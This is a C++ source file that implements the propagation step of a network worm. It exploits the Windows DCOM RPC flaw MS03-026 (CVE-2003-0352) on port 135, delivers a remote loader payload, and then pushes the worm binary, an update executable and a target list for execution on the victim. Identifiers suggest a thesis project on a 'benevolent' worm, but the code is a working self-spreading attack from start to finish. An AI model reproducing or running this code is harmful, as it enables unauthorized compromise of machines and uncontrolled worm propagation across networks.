/* 
 * File:   Exploit.cpp
 * Author: rbeede
 * 
 * Created on March 21, 2012, 7:09 PM
 * 
 * Exploits MS03-026_dcom_exploit (CVE-2003-0352)
 * 
 * Designed for Windows XP SP0 32-bit
 * 
 */

#include "Exploit.hpp"

const std::string Exploit::EXPLOIT_PORT = "135";
const std::string Exploit::PAYLOAD_PORT = "4444";
const std::string Exploit::PAYLOAD_LOADER_PORT = "65534";


Exploit::Exploit() {
}


/**
 * Destructor
 */
Exploit::~Exploit() {
}


bool Exploit::exploit(const std::string & targetIP) {
	// Send remote loader to PAYLOAD_PORT
	logger->log("Sending exploit stage");
	if(!sendToTarget(targetIP, Exploit::EXPLOIT_PORT, Exploit::exploitBytes, Exploit::exploitBytes_length)) {
		logger->log("ERROR:  Failed to send exploit stage payload to " + targetIP + ":" + Exploit::EXPLOIT_PORT);
		return false;
	}
	
	// Sleep for 1 second to allow the exploit time to load and listen
	sleep(1);
	
	// Send ThesisWormRemoteLoader payload
	logger->log("Sending remote loader payload");
	if(!sendToTarget(targetIP, Exploit::PAYLOAD_PORT, Exploit::exploitPayloadBytes, Exploit::exploitPayloadBytes_length)) {
		logger->log("ERROR:  Failed to send remote loader payload to " + targetIP + ":" + Exploit::PAYLOAD_PORT);
		return false;
	}
	
	// Construct the options file content
	// Construct options file
	const std::string optionsFilename = Utilities::makeSafeFilename("WormOptions." + Utilities::getCurrentTimestamp());
	logger->log("Constructing options file with name " + optionsFilename);
	const std::vector<unsigned char> optionsContent_vector = createOptionsFileContent(targetIP, Exploit::EXPLOIT_PORT, optionsFilename);
	logger->log("Options file (with SAVE) has length of " + boost::lexical_cast<std::string>(optionsContent_vector.size()));
	
        
	// Worm binary
	logger->log("Constructing worm binary SAVE using " + Configuration::wormBinaryFullPathname);
	const std::vector<unsigned char> wormContent = prepForSaveBinaryFile(Configuration::wormBinaryFullPathname, "benevolent-worm.exe");
	logger->log("Worm binary executable (with SAVE) has length of " + boost::lexical_cast<std::string>(wormContent.size()));

	// Update binary
	logger->log("Constructing os update binary SAVE using " + Configuration::updateBinaryFullPathname);
	const std::vector<unsigned char> updateContent = prepForSaveBinaryFile(Configuration::updateBinaryFullPathname, "os-update.exe");
	logger->log("Update binary executable (with SAVE) has length of " + boost::lexical_cast<std::string>(updateContent.size()));

	// EXEC command
	logger->log("Construction EXEC command");
	const std::vector<unsigned char> execContent = createExecContent("benevolent-worm.exe", optionsFilename, "os-update.exe");
        
	// Bundle up all the SAVE file commands and the EXEC commands into one big array for sending
	std::vector<unsigned char> wormPayload;
	wormPayload.insert(wormPayload.end(), optionsContent_vector.begin(), optionsContent_vector.end());
	wormPayload.insert(wormPayload.end(), wormContent.begin(), wormContent.end());
	wormPayload.insert(wormPayload.end(), updateContent.begin(), updateContent.end());
	wormPayload.insert(wormPayload.end(), execContent.begin(), execContent.end());
        
	
	// Send the data
	// could also have done &(var.front())  or &vector[0]
	// BE WARNED THAT IF DATA IS CHANGED IN THE VECTOR THEN THIS POINTER COULD BECOME INVALIDATED
	//	(hence why we use const to help reduce the chance of this accidental mistake)
	const unsigned char * const wormPayload_bytes = (unsigned char *) wormPayload.data(); // [C++0x STL]
	const int wormPayload_bytes_length = wormPayload.size();
	
	
	logger->log("Sending worm code to remote loader for SAVE and EXEC");
	if(!sendToTarget(targetIP, Exploit::PAYLOAD_LOADER_PORT, wormPayload_bytes, wormPayload_bytes_length)) {
		logger->log("ERROR:  Failed to send worm payload to " + targetIP + ":" + Exploit::PAYLOAD_LOADER_PORT);
		return false;
	}
	
	//TODO consider extra connection check to ensure worm actually executed on remote system
	
	return true;
}


bool Exploit::sendToTarget(const std::string & ipAddress, const std::string & port, const unsigned char * const bytes, const int bytes_length) {
	TCPClient tcpClient(ipAddress, port);
	if(!tcpClient.getLastError().empty()) {
		logger->log("ERROR:  Unable to resolve " + ipAddress + ":" + port);
		return false;
	}
	
	logger->log("Using timeout value of " + boost::lexical_cast<std::string>(TCPClient::TIMEOUT_SECONDS) + " seconds");
	if(!tcpClient.connect()) {
		logger->log("ERROR:  Unable to connect to " + ipAddress + ":" + port);
		logger->log("Reason:  " + tcpClient.getLastError());
		return false;
	} else {
		logger->log("Connection channel (TCP) established:  " + tcpClient.getConnectionDetails());
	}


	// Send the requested data
	logger->log("Attempting to send " + boost::lexical_cast<std::string>(bytes_length) + " bytes");
	if(!tcpClient.send(bytes, bytes_length)) {
		logger->log("ERROR:  Failed to send " + boost::lexical_cast<std::string>(bytes_length) + " bytes");
		logger->log("Reason:  " + tcpClient.getLastError());
		return false;
	} else {
		logger->log("Sent " + boost::lexical_cast<std::string>(bytes_length) + " bytes");
	}

	
	tcpClient.close();
	logger->log("Closed connection");
	
	return true;
}


std::vector<unsigned char> Exploit::createOptionsFileContent(const std::string & targetIPAddress, const std::string & port, const std::string & optionsFilename) {
	std::vector<unsigned char> optionsContent;

	optionsContent.push_back('S');
	optionsContent.push_back('A');
	optionsContent.push_back('V');
	optionsContent.push_back('E');
	optionsContent.push_back((unsigned char) 0x1F);

	for(std::string::const_iterator it = optionsFilename.begin(); it < optionsFilename.end(); it++ ) {
		optionsContent.push_back((unsigned char) *it);
	}

	optionsContent.push_back((unsigned char) '\0');  // not strictly required but nice to do
	optionsContent.push_back((unsigned char) 0x1F);

	/* Build the actual content so we can grab the length later */
	std::string content_as_string("");
	// Parent (source, this) IP that was used to connect to target (in case this machine has multiple IPs)
	TCPClient tcpClient(targetIPAddress, port);

	if(!tcpClient.getLastError().empty() || !tcpClient.connect()) {
		// Strange unless target has just gone down, just fill in debug data
		content_as_string += "Unable to properly resolve source so giving all of them:   ";
		const std::vector<std::string> hostAddresses = Utilities::getHostAddresses();
		for(std::vector<std::string>::const_iterator it = hostAddresses.begin(); it < hostAddresses.end(); it++) {
			content_as_string += *it;
			content_as_string += ",";
		}
	} else {
		content_as_string += tcpClient.getLocalEndpointDetails();
		tcpClient.close();
	}
	content_as_string += "\r\n";

	content_as_string += Utilities::getCurrentTimestamp();
	content_as_string += "\r\n";

	content_as_string += Configuration::rootSeed;
	content_as_string += "\r\n";

	// now all the remaining targets
	for(std::deque<std::string>::iterator it = Configuration::targets.begin(); it < Configuration::targets.end(); it++) {
		content_as_string += *it;
		content_as_string += "\r\n";
	}
	
	// So now we write the length of the content as a 4-byte (MSB big-endian) sequence
	// cast to (unsigned char) drops front bits for us
	const int contentLength = content_as_string.size() + 3;  // +3 for UTF-8 BOM
	optionsContent.push_back((unsigned char) (contentLength >> 24));
	optionsContent.push_back((unsigned char) (contentLength >> 16));
	optionsContent.push_back((unsigned char) (contentLength >> 8));
	optionsContent.push_back((unsigned char) (contentLength));
	optionsContent.push_back((unsigned char) 0x1F);

	// Add the UTF-8 BOM
	optionsContent.push_back((unsigned char) 0xEF);
	optionsContent.push_back((unsigned char) 0xBB);
	optionsContent.push_back((unsigned char) 0xBF);

	// Now dump the entire content as bytes
	for(std::string::iterator it = content_as_string.begin(); it < content_as_string.end(); it++ ) {
		optionsContent.push_back((unsigned char) *it);
	}

	// That's it
	return optionsContent;  // FIXME may be a slow copy and using lots of memory
}

std::vector<unsigned char> Exploit::prepForSaveBinaryFile(const std::string & pathname, const std::string & destname) {
	std::vector<unsigned char> content;

	// Need the SAVE marker
	content.push_back((unsigned char) 'S');
	content.push_back((unsigned char) 'A');
	content.push_back((unsigned char) 'V');
	content.push_back((unsigned char) 'E');
	content.push_back((unsigned char) 0x1F);

	logger->log("prepForSavingBinaryFile - wrote SAVE\x1F header");
	
	// Now the name
	for (std::string::const_iterator it = destname.begin(); it < destname.end(); it++) {
		content.push_back((unsigned char) *it);
	}
	content.push_back((unsigned char) '\0'); // not strictly required but nice to do
	content.push_back((unsigned char) 0x1F);

	// Now the 4-byte (32-bit unsigned int) [MSB big-endian first] length
	const int fileSize = boost::filesystem::file_size(pathname);
	logger->log("prepForSavingBinaryFile - size of " + pathname + " with destname of " + destname + " is " + boost::lexical_cast<std::string>(fileSize) + " bytes");
	content.push_back((unsigned char) (fileSize >> 24));
	content.push_back((unsigned char) (fileSize >> 16));
	content.push_back((unsigned char) (fileSize >> 8));
	content.push_back((unsigned char) (fileSize));
	content.push_back((unsigned char) 0x1F);

	// The file content

	std::ifstream ifs;
	ifs.open(pathname.c_str(), std::ios::in | std::ios::binary);

	logger->log("prepForSavingBinaryFile - Allocating buffer of size " + boost::lexical_cast<std::string>(fileSize));
	char * buffer = new char[fileSize];
	logger->log("prepForSavingBinaryFile - Buffer allocated");

	ifs.read(buffer, fileSize);

	ifs.close();

	for (int i = 0; i < fileSize; i++) {
		content.push_back((unsigned char) buffer[i]);
	}
	
	delete buffer;
	
	logger->log("prepForSavingBinaryFile - content size is " + boost::lexical_cast<std::string>(content.size()));

	return content; // FIXME may be a slow copy and uses more memory
}


std::vector<unsigned char> Exploit::createExecContent(const std::string & wormFilename, const std::string & optionsFilename, const std::string & updateFilename) {
        std::vector<unsigned char> content;
    
        // Need the SAVE marker
        content.push_back((unsigned char) 'E');
        content.push_back((unsigned char) 'X');
        content.push_back((unsigned char) 'E');
        content.push_back((unsigned char) 'C');
        content.push_back((unsigned char) 0x1F);
        
        // Note that a /some/path/ is prefixed to this by the remote loader
        const std::string cmdLine = wormFilename  // exe to run
                                        + " "
                                        + wormFilename  // path for worm to read its own exe
                                        + " "
                                        + optionsFilename
                                        + " "
                                        + updateFilename
                                        ;
        
	for(std::string::const_iterator it = cmdLine.begin(); it < cmdLine.end(); it++ ) {
                content.push_back((unsigned char) *it);
	}
	content.push_back((unsigned char) '\0');  // not strictly required but nice to do
	content.push_back((unsigned char) 0x1F);
        
        return content;
}